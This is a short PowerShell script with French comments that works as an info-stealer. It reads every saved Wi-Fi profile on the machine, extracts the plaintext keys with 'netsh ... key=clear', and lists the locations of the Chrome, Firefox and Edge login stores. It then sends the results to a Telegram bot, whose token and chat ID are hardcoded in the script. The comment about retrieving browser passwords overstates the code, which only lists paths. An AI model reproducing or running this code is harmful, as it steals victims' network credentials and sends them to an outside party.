
# R√©cup√©ration des profils Wi-Fi
$wifiProfiles = netsh wlan show profiles | Select-String "Profil Tous les utilisateurs" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiResults = ""
foreach ($profile in $wifiProfiles) {
    $wifiResults += "`n--- $profile ---`n"
    $wifiResults += netsh wlan show profile name="$profile" key=clear | Select-String "Contenu de la cl√©"
}

# R√©cup√©ration des mots de passe stock√©s dans les navigateurs via Windows Credential Manager
$browserResults = ""
try {
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    )
    $browserResults += "`n[!] Emplacements de donn√©es d√©tect√©s:`n"
    $browserResults += ($paths -join "`n")
} catch {
    $browserResults += "`nErreur r√©cup√©ration navigateurs"
}

# Construction du message
$msg = "üì° R√©sultats Wi-Fi:`n$wifiResults`n`nüåê R√©sultats Navigateurs:`n$browserResults"

# Envoi √† Telegram
$token = "7520987680:AAHyZDj5XYSZ4opgTeGNwISTCS2aGY0VTNc"
$chat = "1607044467"
$msg = [System.Web.HttpUtility]::UrlEncode($msg)
Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat&text=$msg"
